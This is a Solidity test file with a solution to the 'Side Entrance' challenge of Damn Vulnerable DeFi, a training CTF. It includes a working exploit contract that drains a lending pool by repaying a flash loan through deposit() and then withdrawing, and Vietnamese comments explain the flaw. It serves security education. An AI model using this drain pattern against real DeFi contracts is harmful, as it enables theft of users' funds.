// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploiter {
    
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function startAttack() public {
        // Request a flash loan with all the balance in the pool
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }
    
    // The callback function after the flashloan
    function execute() public payable {
        // Deposit the received ETH back to the pool
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        // Transfer the ETH to the recovery account
        payable(recovery).transfer(address(this).balance);
    }
}

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /*
    Lỗ hổng
    Hàm flashLoan() cho phép gọi bất kỳ địa chỉ nào (bao gồm chính người gọi) và chỉ yêu cầu hoàn trả ETH vào cuối giao dịch.
    Vì deposit() tăng số dư nội bộ (balances[msg.sender]), ta có thể hoàn trả khoản vay bằng cách gọi deposit() từ chính contract tấn công
    làm pool nghĩ rằng đã được hoàn trả, nhưng attacker vẫn có quyền rút tiền sau đó.
    Crack
    Trong execute(), gọi pool.deposit{value: amount}() để “trả” lại flashloan.
    Sau khi flashloan kết thúc, gọi pool.withdraw() để rút toàn bộ ETH đã “gửi” vào.
    Gửi toàn bộ ETH rút được về recovery.
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Constructor sẽ lưu lại địa chỉ pool và recovery
        SideEntranceExploiter exploiter = new SideEntranceExploiter(pool, recovery);
        // Gọi flashLoan để mượn ETH, gửi lại qua deposit(), rút toàn bộ và chuyển về recovery
        exploiter.startAttack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}